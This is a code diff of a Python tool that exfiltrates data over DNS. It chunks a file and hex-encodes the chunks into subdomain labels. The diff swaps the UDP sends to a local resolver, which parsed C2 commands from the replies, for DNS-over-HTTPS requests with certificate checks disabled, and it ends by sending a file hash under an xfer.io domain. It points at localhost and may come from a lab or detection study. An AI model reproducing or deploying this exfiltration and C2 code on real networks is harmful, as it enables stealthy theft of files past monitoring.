@@ -65,32 +65,36 @@ def process(seq, buf):
     i = len(res_hex) // 2
     a, b = res_hex[:i], res_hex[i:]
   return f'{hex(seq)[2:]}.{a}.{b}.{domain}.{tld}'
-  
 
-def send(file, time_delay):
+
+def send_https(file, delay):
   with open(file, 'rb') as f:
     hash = hashlib.sha256()
 
     seq = 0
     while True:
-      buf = f.read(32)
+      buf = f.read(16)
       hash.update(buf)
       if not buf:
         break
-      q = DNSRecord.question(process(seq, buf))
-      a = q.send("localhost", 8053, tcp=False)
-      c2cmd = str(DNSRecord.parse(a).rr[0].rdata).split('.')
-      sleep(int(c2cmd[3]))
+      
+      url = process(seq,buf)
+      r = requests.get(f'https://localhost:5000/dns-query?name={url}',verify=False)
+      sleep(delay)
+      if r.status_code != 200:
+        print(seq, buf)
+        print(f'{r.status_code} --- {url}')
       seq += 1
     
     hash_hex = hash.hexdigest()
     i = random.randint(3,60)
-    q = DNSRecord.question(f'{hash_hex[:i]}.{hash_hex[i:]}.xfer.io')
-    q.send("localhost", 8053, tcp=False)
-
+    url = f'{hash_hex[:i]}.{hash_hex[i:]}.xfer.io'
+    
+    r = requests.get(f'https://localhost:5000/dns-query?name={url}', verify=False)
+    print(r.status_code)
 
 
 
 if __name__ == "__main__":
   if len(sys.argv) > 1 and os.path.exists(sys.argv[1]):
-    send(sys.argv[1], 0)
+    send_https(sys.argv[1], 0)
